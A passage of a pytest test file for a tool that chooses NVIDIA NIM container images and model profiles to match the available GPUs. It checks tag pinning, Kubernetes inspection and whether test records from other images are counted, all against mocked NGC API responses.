@pytest.mark.parametrize("newest_vram", [None, 20.0], ids=["no-vram", "vram-recorded"])
def test_select_prefers_the_build_for_this_gpu_when_it_confirms_more(
    tmp_path: Path, newest_vram: float | None
) -> None:
    """One RTX 6000 Ada: the newest image's profile is GPU-agnostic and untested there; the
    1.8.0-RTX build's profile is built for it but records no VRAM. Both are unknown. The build
    for this GPU is taken only when it leaves no check open that the newest one leaves closed:
    when the newest records its VRAM need, it stays."""
    rtx = h100_env()
    rtx["groups"][0].update(name="NVIDIA RTX 6000 Ada Generation", pci_device_id="26b1:10de")
    rtx["groups"][0]["pci_device_ids"] = ["26b1:10de"]
    generic = {"profile_id": "generic", "precision": "bf16", "tested_gpu_devices": ["2330:10de"]}
    if newest_vram is not None:
        generic["min_vram_per_device_gb"] = newest_vram
    built = {"profile_id": "rtx", "gpu_device": "26b1:10de", "precision": "fp8"}
    routes = select_routes(
        {
            f"{LLAMA_ID}:2.1.4": meta(generic),
            f"{SPARK_ID}:1.0.0-variant": OTHER_GPU,
            f"{LLAMA_ID}:1.8.0-RTX": meta(built),
        }
    )
    code, payload, _ = run_select(tmp_path, routes, env=rtx)
    assert code == 0, payload
    assert considered(payload)[:3] == [
        ("2.1.4", "newest", "published", "unknown"),
        ("1.0.0-variant", "variant", "published", "does_not_fit"),
        ("1.8.0-RTX", "variant", "published", "unknown"),
    ]
    facts = payload["facts"]
    checked = facts["images_considered"]
    assert [i["tier"] for i in checked[:3]] == ["agnostic", None, "direct"]
    assert checked[2]["reasons"] == ["vram_not_recorded"]
    choice = facts["image_choice"]
    if newest_vram is None:
        assert checked[0]["reasons"] == ["gpu_not_tested", "vram_not_recorded"]
        assert (choice["kind"], choice["image"]) == ("variant", f"nvcr.io/{LLAMA_ID}:1.8.0-RTX")
        reason = choice["reason"]
        assert "built for this GPU and leaves fewer checks open than that of 2.1.4" in reason
        assert facts["best_unconfirmed"]["reasons"] == ["vram_not_recorded"]
    else:
        assert checked[0]["reasons"] == ["gpu_not_tested"]
        assert (choice["kind"], choice["image"]) == ("newest", f"nvcr.io/{LLAMA_ID}:2.1.4")
        assert choice["reason"].endswith("this one comes first")
        assert facts["best_unconfirmed"]["reasons"] == ["gpu_not_tested"]


def test_select_names_each_unread_image_list_once(tmp_path: Path) -> None:
    """Neither image list is public. The newest image's CPU architectures come from its record
    (one note names the 403); the repo's other images are arch_not_recorded, said without the
    403 again; the variant's own record note stays."""
    spark = {
        "name": "llama-3.1-8b-instruct-dgx-spark",
        "tags": ["1.0.0-variant", "latest"],
        "latestTag": "latest",
        "latestArchitectureVariants": [{"os": "linux", "architecture": "arm64"}],
    }
    spark_403 = (403, {"requestStatus": {"statusCode": "FORBIDDEN", "requestId": "req-spark"}})
    routes = select_routes({f"{LLAMA_ID}:2.1.4": OTHER_GPU, f"{LLAMA_ID}:2.0.13": FITS})
    routes.update(
        {
            f"{REPO_PATH}/images": FORBIDDEN,
            f"/v2/repos/{SPARK_ID}": (200, spark),
            f"/v2/repos/{SPARK_ID}/images": spark_403,
        }
    )
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 0, payload
    notes = payload["facts"]["notes"]
    assert sum("req-403" in note for note in notes) == 1
    assert any(f"the other {LLAMA_ID} images were not read either" in note for note in notes)
    [spark_note] = [note for note in notes if "req-spark" in note]
    assert "1.0.0-variant come from the repository record" in spark_note


def test_select_checks_the_build_a_bare_alias_stands_for(tmp_path: Path) -> None:
    """deepseek-r1-distill-llama-8b, image list not public: `1` is checked as 1.5.2 (the Metadata
    API gives both the same profiles), never as the newer 1.8.0-RTX, a build for RTX GPUs."""
    rid = "nim/deepseek-ai/deepseek-r1-distill-llama-8b"
    tags = ["1.8.0-RTX", "1.5.2", "1", "latest", "1.5"]
    repo = {"name": rid.rsplit("/", 1)[-1], "tags": tags, "latestTag": "1.8.0-RTX"}
    routes = {
        f"/v2/repos/{rid}": (200, repo),
        f"/v2/repos/{rid}/images": FORBIDDEN,
        meta_key(rid, "1.5.2"): FITS,
        meta_key(rid, "1.8.0-RTX"): OTHER_GPU,
    }
    code, payload, _ = run_select(tmp_path, routes, rid, "--tag", "1")
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload) == [("1.5.2", "requested", "published", "unknown")]
    assert facts["handoff"]["image"] == f"nvcr.io/{rid}:1.5.2"
    assert facts["image_choice"]["reason"] == (
        "the build `1` stands for; its fit could not be confirmed"
    )
    assert any("replaced by 1.5.2" in note for note in facts["notes"])


def test_the_handoff_names_the_backend(tmp_path: Path) -> None:
    """nim-tune tunes vLLM NIMs only: the hand-off says which backend the profile uses."""
    trt = {**profile("trt"), "inference_backend": "tensorrt_llm"}
    handoff = fit_profiles(tmp_path, write_env(tmp_path, h100_env()), trt)["facts"]["handoff"]
    assert (handoff["model_profile"], handoff["backend"]) == ("trt", "tensorrt_llm")


@pytest.mark.parametrize(
    ("tags", "latest", "tag", "source", "what"),
    [
        (["latest"], "latest", "latest", "latest_tag_field", "is not a version"),
        (
            ["1.2", "1.1.0", "latest"],
            "latest",
            "1.2",
            "newest_version",
            "is an alias with no build",
        ),
    ],
)
def test_resolve_warns_when_no_build_can_be_pinned(
    tags: list[str], latest: str, tag: str, source: str, what: str
) -> None:
    """The hard rule to pin a version tag: a tag that can move to another build cannot pin a
    profile; the user decides."""
    rid = "nim/acme/moving"
    repo = {"name": "moving", "tags": tags, "latestTag": latest}
    with serve({f"/v2/repos/{rid}": (200, repo)}) as server:
        code, payload = run_cli("nimselect.py", "resolve", rid, env=ngc_env(server))
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["tag"], facts["tag_source"]) == (tag, source)
    [warning] = [w for w in facts["warnings"] if "cannot be pinned" in w]
    assert what in warning and "Ask the user before the hand-off" in warning
    with serve({f"/v2/repos/{rid}": (200, {**repo, "tags": ["1.2.0", *tags]})}) as server:
        code, payload = run_cli("nimselect.py", "resolve", rid, env=ngc_env(server))
    assert code == 0, payload
    assert not any("cannot be pinned" in w for w in payload["facts"]["warnings"])


@pytest.mark.parametrize("command", [["nimselect.py", "inspect"], ["env_inspect.py"]])
def test_inspect_k8s_rejects_host_options_and_a_cluster_without_gpus(
    tmp_path: Path, command: list[str]
) -> None:
    """Both command lines check and answer alike: a host option is bad input to fix, and a
    cluster with no schedulable GPU node asks the user."""
    script, *sub = command
    flags = [*sub, "--target", "k8s", "--context", "c", "--namespace", "n"]
    for option in (["--gpus", "0,1"], ["--cache-dir", str(tmp_path)]):
        code, payload = run_cli(script, *flags, *option, env=kube_tools(tmp_path))
        assert code == 2, payload
        error = payload["errors"][0]
        assert (payload["next"], error["code"]) == ("fix_errors", "bad_input")
        assert option[0] in error["message"]
    cpu_only = tmp_path / "nodes.json"
    node = {
        "metadata": {"labels": {"kubernetes.io/arch": "amd64"}},
        "spec": {},
        "status": {
            "allocatable": {"cpu": "8", "memory": "32Gi"},
            "conditions": [{"type": "Ready", "status": "True"}],
        },
    }
    cpu_only.write_text(json.dumps({"items": [node]}), encoding="utf-8")
    cpu_tools = tmp_path / "cpu-only"
    cpu_tools.mkdir()
    fake_tool(
        cpu_tools,
        "kubectl",
        f'case "$*" in\n{KUBE_CONTEXTS}  *resourcequota*) echo \'{{"items": []}}\' ;;\n'
        f"  *nodes*) cat '{cpu_only}' ;;\nesac\n",
    )
    code, payload = run_cli(script, *flags, env={"PATH": on_path(cpu_tools)})
    assert code == 3, payload
    assert (payload["next"], payload["errors"][0]["code"]) == ("ask_user", "no_gpus")


def test_select_on_kubernetes_with_hidden_gpus_asks_for_whole_gpus(tmp_path: Path) -> None:
    hidden = h100_env(
        target="k8s",
        gpus_known=False,
        groups=[],
        conditions=[{"code": "gpus_partitioned", "message": "1 GPU node(s) use MIG"}],
    )
    code, payload, requested = run_select(tmp_path, select_routes({}), env=hidden)
    assert code == 3
    error = payload["errors"][0]
    assert error["code"] == "gpus_unknown" and "--gpus" not in error["fix"]
    assert "context" in error["fix"] and requested == []


# --- a faster profile (facts.alternative), and --profile ---------------------------------------


def spark_env() -> dict[str, Any]:
    """The DGX Spark of the report: one GB10 (2e12:10de, compute capability 12.1) that shares the
    host's 128.5 GB, on arm64."""
    gb10 = {
        "name": "NVIDIA GB10",
        "pci_device_id": "2e12:10de",
        "pci_device_ids": ["2e12:10de"],
        "pci_source": "nvidia-smi",
        "memory_mib": None,
        "memory_gb": 128.5,
        "unified_memory": True,
        "compute_capability": "12.1",
        "count": 1,
        "idle": 1,
        "indices": [0],
        "idle_indices": [0],
        "driver_version": "580.95.05",
    }
    docker = {"present": True, "nvidia_runtime": True, "cdi": False}
    return h100_env(groups=[gb10], driver_version="580.95.05", cpu_count=20, memory_gb=128.5,
                    arch="arm64", disk_free_gb=3000.0, docker=docker)  # fmt: skip


def run_on_spark(
    tmp_path: Path, *args: str, published: tuple[str, ...] = ("2.1.6",)
) -> tuple[int, dict[str, Any], list[str]]:
    routes = lightning_routes(*published)
    return run_select(tmp_path, routes, LIGHTNING_ID, *args, env=spark_env())


def test_select_on_a_dgx_spark_offers_the_faster_profile_not_tested_there(tmp_path: Path) -> None:
    """On a DGX Spark, 2.1.6's bf16 profile tested on GB10 fits and stays the recommendation. No
    older image publishes metadata here, so its own nvfp4 profile, GPU-agnostic and tested on no
    GPU, is offered beside it, unconfirmed, with the select that pins it."""
    code, payload, _ = run_on_spark(tmp_path)
    assert code == 0, payload
    assert (payload["state"], payload["next"]) == ("fits", "confirm_with_user")
    facts = payload["facts"]
    assert considered(payload)[0] == ("2.1.6", "newest", "published", "fits")
    assert facts["image_choice"]["reason"] == "newest version that fits"
    assert facts["recommended"]["profile_id"] == LIGHTNING_BF16
    assert (facts["handoff"]["model_profile"], facts["handoff"]["verdict"]) == (
        LIGHTNING_BF16,
        "fits",
    )
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["confirmed"]) == (
        f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        "newest",
        False,
    )
    assert (alternative["profile_id"], alternative["precision"], alternative["backend"]) == (
        LIGHTNING_NVFP4,
        "nvfp4",
        "vllm",
    )
    assert (alternative["gpus_required"], alternative["reasons"]) == (1, ["gpu_not_tested"])
    [note] = [note for note in facts["notes"] if note.startswith("facts.alternative")]
    assert note == (
        f"facts.alternative, the profile {LIGHTNING_NVFP4}, is faster (nvfp4) than the "
        "recommended bf16, but this image's NGC metadata records no test of it on this GPU: offer "
        "it in the confirm question beside the recommended profile, as a choice that stays "
        "unconfirmed. On a yes, "
        f"run select {LIGHTNING_ID} --tag 2.1.6 --profile={LIGHTNING_NVFP4} with the other "
        f"options as before but --out {nimselect.ALTERNATIVE_OUT} (the first select's file "
        "stays), and hand off that result and its file (verdict unknown: say the profile is "
        "unconfirmed)."
    )
    # --prefer accuracy ranks bf16 first: nothing is offered
    code, payload, _ = run_on_spark(tmp_path, "--prefer", "accuracy")
    assert code == 0, payload
    assert payload["facts"]["alternative"] is None
    assert not any(note.startswith("facts.alternative") for note in payload["facts"]["notes"])


SPARK_215 = ("2.1.6", "2.1.5")  # the documents NGC published on 2026-11-18


CARRIED_WHY = (
    "Tested on this GPU (2e12:10de) in 2.1.5 (same profile id); this image's metadata records no "
    "test"
)


def test_select_on_a_dgx_spark_counts_the_gb10_test_2_1_5_records_for_the_same_profile(
    tmp_path: Path,
) -> None:
    """NGC on 2026-11-18: 2.1.6 records the GB10 as tested only for its bf16 profile, and 2.1.5
    records it for the nvfp4 profiles with the same ids. A profile id is one profile, so select
    counts 2.1.5's test in 2.1.6 too: it recommends 2.1.6, the newest image, with the nvfp4 profile
    without LoRA, and a why line naming 2.1.5. The bf16 profile 2.1.6 tested itself stays a fit
    below it, and nothing is left to offer as the faster choice."""
    code, payload, _ = run_on_spark(tmp_path, published=SPARK_215)
    assert code == 0, payload
    assert (payload["state"], payload["next"]) == ("fits", "confirm_with_user")
    facts = payload["facts"]
    assert considered(payload) == [
        ("2.1.6", "newest", "published", "fits"),
        ("2.1.5", "older", "published", "fits"),
        ("2.1.4", "older", "not_published", None),
        ("2.0.13", "older", "not_published", None),
    ]
    assert facts["image_choice"] == {
        "image": f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        "kind": "newest",
        "reason": "newest version that fits",
    }
    recommended = facts["recommended"]
    assert (recommended["profile_id"], recommended["verdict"], recommended["tier"]) == (
        LIGHTNING_NVFP4,
        "fits",
        "tested",
    )
    assert (recommended["precision"], recommended["backend"], recommended["gpus_required"]) == (
        "nvfp4",
        "vllm",
        1,
    )
    assert recommended["reasons"] == ["tested_in_other_image"]
    assert recommended["why"] == [
        CARRIED_WHY,
        "Needs 30 GB per GPU; each GPU has 128.5 GB",
        "Needs 1 GPU; 1 is available",
    ]
    assert facts["handoff"] == {
        "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
        "image": f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        "model_profile": LIGHTNING_NVFP4,
        "verdict": "fits",
        "backend": "vllm",
        "gpus": "device=0",
        "gpu_ids": [0],
        "gpu_count": 1,
        "gpu_name": "NVIDIA GB10",
        "confirm_with": "list-model-profiles",
    }
    shortlist = [
        (r["profile_id"], r["precision"], r["reasons"], r["verdict"]) for r in facts["shortlist"]
    ]
    assert shortlist[:3] == [
        (LIGHTNING_NVFP4, "nvfp4", ["tested_in_other_image"], "fits"),
        (LIGHTNING_NVFP4_LORA, "nvfp4", ["tested_in_other_image"], "fits"),  # LoRA, not asked for
        (LIGHTNING_BF16, "bf16", [], "fits"),  # tested on the GB10 by 2.1.6's own metadata
    ]
    assert facts["alternative"] is None
    assert alternative_notes(payload) == []
    assert fit.TESTED_ELSEWHERE_NOTE in facts["notes"]
    # the entry of 2.1.6 names the profile and its note, which leaves no check open
    newest = facts["images_considered"][0]
    assert (newest["profile_id"], newest["tier"], newest["reasons"]) == (
        LIGHTNING_NVFP4,
        "tested",
        ["tested_in_other_image"],
    )
    # 2.1.5 is judged with 2.1.6's records as well; its own record names the GB10
    older = facts["images_considered"][1]
    assert (older["profile_id"], older["reasons"]) == (LIGHTNING_NVFP4, [])
    # --prefer accuracy: the bf16 profile tested by 2.1.6 itself ranks first, and nothing is more
    # accurate
    code, payload, _ = run_on_spark(tmp_path, "--prefer", "accuracy", published=SPARK_215)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["recommended"]["profile_id"], facts["recommended"]["reasons"]) == (
        LIGHTNING_BF16,
        [],
    )
    assert facts["alternative"] is None
    # --tag 2.1.6 and fit check that image alone, and read the other images a select without a
    # tag checks for their test records: the same nvfp4 profile, with the same why line
    code, payload, requested = run_on_spark(tmp_path, "--tag", "2.1.6", published=SPARK_215)
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload) == [("2.1.6", "requested", "published", "fits")]
    assert (facts["recommended"]["profile_id"], facts["recommended"]["why"][0]) == (
        LIGHTNING_NVFP4,
        CARRIED_WHY,
    )
    assert (facts["handoff"]["model_profile"], facts["handoff"]["verdict"]) == (
        LIGHTNING_NVFP4,
        "fits",
    )
    assert facts["alternative"] is None
    assert [path for path in requested if path.startswith(METADATA_PATH)] == [
        meta_key(LIGHTNING_ID, tag) for tag in ("2.1.6", "2.1.5", "2.1.4", "2.0.13")
    ]
    env_file = write_env(tmp_path, spark_env())
    with serve(lightning_routes(*SPARK_215)) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LIGHTNING_ID,
            "--tag",
            "2.1.6",
            "--env",
            str(env_file),
            env=ngc_env(server),
        )
    assert code == 0, payload
    assert (payload["facts"]["recommended"]["why"][0], payload["facts"]["alternative"]) == (
        CARRIED_WHY,
        None,
    )
    assert payload["facts"]["handoff"]["model_profile"] == LIGHTNING_NVFP4
    # only --max-images 1 reads 2.1.6 alone, with no record of another image: the bf16 profile,
    # with the nvfp4 one offered beside it, unconfirmed
    code, payload, requested = run_on_spark(tmp_path, "--max-images", "1", published=SPARK_215)
    assert code == 0, payload
    facts = payload["facts"]
    assert facts["recommended"]["profile_id"] == LIGHTNING_BF16
    assert not any(note == fit.TESTED_ELSEWHERE_NOTE for note in facts["notes"])
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["kind"], alternative["confirmed"]) == (
        f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        "newest",
        False,
    )
    assert alternative["profile_id"] == LIGHTNING_NVFP4
    assert [path for path in requested if path.startswith(METADATA_PATH)] == [
        meta_key(LIGHTNING_ID, "2.1.6")
    ]


def gb300_node_env() -> dict[str, Any]:
    """The Kubernetes GPU node of the report's GB300 check: four GB300 (31c2:10de from the product
    table, compute capability 10.3, 298.01 GB each) on an arm64 node."""
    gb300 = {
        "name": "NVIDIA-GB300",
        "pci_device_id": "31c2:10de",
        "pci_device_ids": ["31c2:10de"],
        "pci_source": "product-table",
        "memory_mib": 284208,
        "memory_gb": 298.01,
        "unified_memory": False,
        "compute_capability": "10.3",
        "count": 4,
        "idle": 4,
        "indices": [],
        "idle_indices": [],
        "node_count": 1,
        "arch": "arm64",
        "cpu_count": 144,
        "driver_version": "580.167.08",
        "host_memory_gb": 1027.27,
    }
    return h100_env(target="k8s", context="c", namespace="default", groups=[gb300],
                    driver_version="580.167.08", cpu_count=16, memory_gb=134.2, arch=None,
                    disk_free_gb=None, docker=None)  # fmt: skip


def test_select_on_gb300_nodes_keeps_the_nvfp4_profile_and_takes_the_newest_image(
    tmp_path: Path,
) -> None:
    """GB300 nodes: 2.1.6 records no test of any profile on the GB300, and 2.1.5 records it for
    the nvfp4 profile on 4 GPUs that select took from 2.1.5 before. With 2.1.5's records that
    profile counts as tested in 2.1.6 as well, so the choice is the same profile, fits, in the
    newest image. Without 2.1.5's metadata 2.1.6 stays unknown."""
    nvfp4_tp4 = "f55a64aafb792fd5cb325c00850e2cb10c7f1c1e9ecb0da7a45cb318dd0f1929"
    routes = lightning_routes(*SPARK_215)
    code, payload, _ = run_select(tmp_path, routes, LIGHTNING_ID, env=gb300_node_env())
    assert code == 0, payload
    assert (payload["state"], payload["next"]) == ("fits", "confirm_with_user")
    facts = payload["facts"]
    assert considered(payload)[:2] == [
        ("2.1.6", "newest", "published", "fits"),
        ("2.1.5", "older", "published", "fits"),
    ]
    recommended = facts["recommended"]
    assert (recommended["profile_id"], recommended["precision"]) == (nvfp4_tp4, "nvfp4")
    assert (recommended["gpus_required"], recommended["tier"]) == (4, "tested")
    assert recommended["reasons"] == ["tested_in_other_image", "pci_inferred"]
    assert recommended["why"][0] == (
        "Tested on this GPU (31c2:10de) in 2.1.5 (same profile id); this image's metadata records "
        "no test"
    )
    handoff = facts["handoff"]
    assert (handoff["image"], handoff["model_profile"], handoff["gpus"], handoff["verdict"]) == (
        f"nvcr.io/{LIGHTNING_ID}:2.1.6",
        nvfp4_tp4,
        4,
        "fits",
    )
    # 2.1.5's own entry: the same profile, tested there by its own metadata
    assert facts["images_considered"][1]["profile_id"] == nvfp4_tp4
    assert facts["alternative"] is None
    # 2.1.6 alone: no profile is tested on the GB300, so it is unknown
    code, payload, _ = run_select(tmp_path, lightning_routes(), LIGHTNING_ID, env=gb300_node_env())
    assert code == 0, payload
    assert considered(payload)[0] == ("2.1.6", "newest", "published", "unknown")
    assert payload["facts"]["best_unconfirmed"]["reasons"][0] == "gpu_not_tested"


def test_a_record_counts_only_within_the_repository_and_for_the_same_profile_id(
    tmp_path: Path,
) -> None:
    """The newest llama image's fp8 profile `shared` was tested on a B200 only. The DGX Spark
    variant, another repository, records the same id as tested on the H100 NVL, and 2.0.13 records
    another id: neither counts, so 2.1.4 stays unknown and select takes the variant, which fits by
    its own record. 2.0.13 recording `shared` itself, an image of the same repository on an older
    line, with the same workspace_hash, makes it count in 2.1.4, which then fits; with other files,
    or with no hash in either image, it does not."""
    shared_b200 = blackwell("shared", "fp8")
    images = {
        f"{LLAMA_ID}:2.1.4": meta(shared_b200),
        f"{SPARK_ID}:1.0.0-variant": meta(blackwell("shared", "fp8", (H100_PCI,))),
        f"{LLAMA_ID}:2.0.13": meta(blackwell("other-id", "fp8", (H100_PCI,))),
    }
    code, payload, _ = run_select(tmp_path, select_routes(images))
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload) == [
        ("2.1.4", "newest", "published", "unknown"),
        ("1.0.0-variant", "variant", "published", "fits"),
        ("2.0.13", "older", "published", "fits"),
        ("1.15.5", "older", "not_published", None),
    ]
    assert facts["images_considered"][0]["reasons"] == ["gpu_not_tested"]
    assert (facts["image"], facts["recommended"]["reasons"]) == (
        f"nvcr.io/{SPARK_ID}:1.0.0-variant",
        [],
    )
    assert fit.TESTED_ELSEWHERE_NOTE not in facts["notes"]
    for newest, older in ((FILES, "bbb"), (FILES, None), (None, FILES)):
        images[f"{LLAMA_ID}:2.1.4"] = meta(blackwell("shared", "fp8", workspace_hash=newest))
        lent = blackwell("shared", "fp8", (H100_PCI,), workspace_hash=older)
        images[f"{LLAMA_ID}:2.0.13"] = meta(lent)
        code, payload, _ = run_select(tmp_path, select_routes(images))
        assert code == 0, payload
        unknown = ("2.1.4", "newest", "published", "unknown")
        assert considered(payload)[0] == unknown, (newest, older)
        assert payload["facts"]["image"] == f"nvcr.io/{SPARK_ID}:1.0.0-variant"
    images[f"{LLAMA_ID}:2.1.4"] = meta(shared_b200)
    images[f"{LLAMA_ID}:2.0.13"] = meta(blackwell("shared", "fp8", (H100_PCI,)))
    code, payload, _ = run_select(tmp_path, select_routes(images))
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload)[0] == ("2.1.4", "newest", "published", "fits")
    assert facts["image_choice"]["image"] == f"nvcr.io/{LLAMA_ID}:2.1.4"
    assert facts["recommended"]["why"][0] == (
        f"Tested on this GPU ({H100_PCI}) in 2.0.13 (same profile id); this image's metadata "
        "records no test"
    )


def test_a_confirmed_alternative_fits_by_its_own_images_record(tmp_path: Path) -> None:
    """2.1.4 fits with a bf16 profile. The fp8 profile `fp8-shared` fits in 2.0.13 only by what
    1.15.5 records, and in 1.15.5 by its own record: the alternative names 1.15.5, whose select
    alone, as its note gives it, fits, as an offer "tested on this GPU in 1.15.5" says. A select of
    2.0.13 with its tag reads 1.15.5's record too, so the profile fits there as well."""
    images = {
        f"{LLAMA_ID}:2.1.4": meta(blackwell("bf16-tested", "bf16", (H100_PCI,))),
        f"{SPARK_ID}:1.0.0-variant": OTHER_GPU,
        f"{LLAMA_ID}:2.0.13": meta(blackwell("fp8-shared", "fp8")),
        f"{LLAMA_ID}:1.15.5": meta(blackwell("fp8-shared", "fp8", (H100_PCI,))),
    }
    routes = select_routes(images)
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 0, payload
    facts = payload["facts"]
    assert [(i["tag"], i["verdict"], i["reasons"]) for i in facts["images_considered"]] == [
        ("2.1.4", "fits", []),
        ("1.0.0-variant", "does_not_fit", []),
        ("2.0.13", "fits", ["tested_in_other_image"]),
        ("1.15.5", "fits", []),
    ]
    alternative = facts["alternative"]
    assert (alternative["image"], alternative["profile_id"], alternative["confirmed"]) == (
        f"nvcr.io/{LLAMA_ID}:1.15.5",
        "fp8-shared",
        True,
    )
    assert alternative["offer"] == (
        "faster (fp8) and tested on this GPU, but in the older image 1.15.5"
    )
    [note] = alternative_notes(payload)
    assert f"run select {LLAMA_ID} --tag 1.15.5 --profile=fp8-shared with" in note
    pinned = ("--tag", "1.15.5", "--profile", "fp8-shared")
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, *pinned)
    assert (code, payload["state"], payload["facts"]["handoff"]["verdict"]) == (0, "fits", "fits")
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, "--tag", "2.0.13")
    assert (code, payload["state"]) == (0, "fits")
    assert payload["facts"]["recommended"]["why"][0] == (
        f"Tested on this GPU ({H100_PCI}) in 1.15.5 (same profile id); this image's metadata "
        "records no test"
    )


def test_select_pinned_to_the_alternative_of_an_older_image_hands_it_off_as_fits(
    tmp_path: Path,
) -> None:
    """The user takes the nvfp4 profile of 2.1.5: the select of the note checks that profile of
    2.1.5 alone, which fits on the GB10, and hands off that image."""
    out = tmp_path / "select.json"
    code, payload, _ = run_on_spark(
        tmp_path,
        "--tag",
        "2.1.5",
        "--profile",
        LIGHTNING_NVFP4,
        "--out",
        str(out),
        published=SPARK_215,
    )
    assert code == 0, payload
    assert (payload["state"], payload["next"]) == ("fits", "confirm_with_user")
    facts = payload["facts"]
    assert considered(payload) == [("2.1.5", "requested", "published", "fits")]
    assert facts["image_choice"]["reason"] == "the tag you asked for; it fits"
    assert facts["handoff"] == {
        "model": "nvidia/nemotron-3.5-lightning-30b-a3b",
        "image": f"nvcr.io/{LIGHTNING_ID}:2.1.5",
        "model_profile": LIGHTNING_NVFP4,
        "verdict": "fits",
        "backend": "vllm",
        "gpus": "device=0",
        "gpu_ids": [0],
        "gpu_count": 1,
        "gpu_name": "NVIDIA GB10",
        "confirm_with": "list-model-profiles",
    }
    assert [record["profile_id"] for record in facts["shortlist"]] == [LIGHTNING_NVFP4]
    assert facts["alternative"] is None
    assert json.loads(out.read_text(encoding="utf-8")) == facts


def test_an_image_whose_metadata_could_not_be_read_lends_no_record_and_a_note_says_so(
    tmp_path: Path,
) -> None:
    """2.1.5's metadata answers HTTP 500, so its GB10 test of the nvfp4 profile is not counted:
    2.1.6 recommends its bf16 profile, with or without --tag, and a note names 2.1.5 and says a
    later select may recommend another profile. With 2.1.5 read there is no such note."""
    failure = (500, {"requestStatus": {"statusCode": "INTERNAL_ERROR", "requestId": "req-500"}})
    routes = {**lightning_routes(), meta_key(LIGHTNING_ID, "2.1.5"): failure}
    note = nimselect.unread_records_note([f"nvcr.io/{LIGHTNING_ID}:2.1.5"])
    assert note == (
        f"Could not read the metadata of nvcr.io/{LIGHTNING_ID}:2.1.5: the tests recorded there "
        "for the same profile ids (tested_in_other_image) were not counted, so a select once it "
        "can be read may recommend another profile or image."
    )
    for args in ([], ["--tag", "2.1.6"]):
        code, payload, _ = run_select(tmp_path, routes, LIGHTNING_ID, *args, env=spark_env())
        assert code == 0, payload
        facts = payload["facts"]
        assert facts["recommended"]["profile_id"] == LIGHTNING_BF16, args
        assert note in facts["notes"], args
    code, payload, _ = run_on_spark(tmp_path, published=SPARK_215)
    assert code == 0, payload
    assert not any(n.startswith("Could not read the metadata") for n in payload["facts"]["notes"])


TOO_MANY = (429, {"requestStatus": {"statusCode": "TOO_MANY_REQUESTS", "requestId": "r-429"}})


@pytest.mark.parametrize("stop", [CLOSE, TOO_MANY], ids=["unreachable", "rate_limited"])
@pytest.mark.parametrize("where", ["records", "search"])
@pytest.mark.parametrize("command", ["select", "fit"])
def test_ngc_stopping_while_other_images_are_read_for_records_still_checks_the_image(
    tmp_path: Path, command: str, where: str, stop: Any
) -> None:
    """--tag 2.1.6 reads the other images a select without a tag checks only for the records they
    lend. NGC stops (no answer, or a 429 after the retries) while it looks for them (search) or
    reads the first, 2.1.5 (records): the image named is still judged, with the records read
    (none), so 2.1.6 gives its bf16 profile, a note says what was not read, and nothing more is
    asked of NGC for them. It used to end the command (exit 4) with no hand-off."""
    routes = lightning_routes("2.1.6")
    routes[SEARCH_PATH if where == "search" else meta_key(LIGHTNING_ID, "2.1.5")] = stop
    env_file = write_env(tmp_path, spark_env())
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py",
            command,
            LIGHTNING_ID,
            "--tag",
            "2.1.6",
            "--env",
            str(env_file),
            env=ngc_env(server),
        )
        requested = list(server.requests)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["recommended"]["profile_id"], facts["handoff"]["verdict"]) == (
        LIGHTNING_BF16,
        "fits",
    )
    if where == "search":
        [note] = [n for n in facts["notes"] if n.startswith(f"The other images of {LIGHTNING_ID}")]
        assert "(tested_in_other_image) were not counted" in note
    else:
        [note] = [n for n in facts["notes"] if n.startswith("Could not read the metadata")]
        assert note.startswith(f"Could not read the metadata of nvcr.io/{LIGHTNING_ID}:2.1.5, ")
    assert meta_key(LIGHTNING_ID, "2.1.4") not in requested


def test_max_images_counts_the_image_named_among_those_read_for_records(tmp_path: Path) -> None:
    """--max-images counts the image named: select --tag 2.1.5 --max-images 1 reads 2.1.5 alone,
    with no search for the others. With --max-images 2 a select without a tag checks 2.1.6 and
    2.1.5; --tag 2.1.4, which is not among them, leaves one place, so 2.1.6 alone lends its
    records (2.1.5 used to be read as well, three images for a limit of two)."""
    routes = lightning_routes("2.1.6", "2.1.5")
    routes[meta_key(LIGHTNING_ID, "2.1.4")] = routes[meta_key(LIGHTNING_ID, "2.1.5")]
    for tag, limit, read in (("2.1.5", "1", ["2.1.5"]), ("2.1.4", "2", ["2.1.4", "2.1.6"])):
        code, payload, requested = run_select(
            tmp_path, routes, LIGHTNING_ID, "--tag", tag, "--max-images", limit, env=spark_env()
        )
        assert code == 0, payload
        metadata = [path for path in requested if path.startswith(METADATA_PATH)]
        assert metadata == [meta_key(LIGHTNING_ID, other) for other in read], limit
        searched = any(path.startswith(SEARCH_PATH) for path in requested)
        assert searched is (limit != "1")


B200_PCI = OTHER_PCI
RTX_PRO_PCI = "2bb5:10de"  # RTX PRO 6000 Blackwell Server Edition
FILES = "aaa"  # a workspace_hash: another image's record counts only for the same one


def b200_env(count: int = 4) -> dict[str, Any]:
    """A host with `count` idle B200 (compute capability 10.0, 192 GB each)."""
    b200 = {
        **h100_env()["groups"][0],
        "name": "NVIDIA B200",
        "pci_device_id": B200_PCI,
        "pci_device_ids": [B200_PCI],
        "memory_mib": 183359,
        "memory_gb": 192.26,
        "compute_capability": "10.0",
        "count": count,
        "idle": count,
        "indices": list(range(count)),
        "idle_indices": list(range(count)),
    }
    return h100_env(groups=[b200])


def blackwell(
    pid: str, precision: str, tested: tuple[str, ...] = (B200_PCI,), tp: int = 1, **fields: Any
) -> dict[str, Any]:
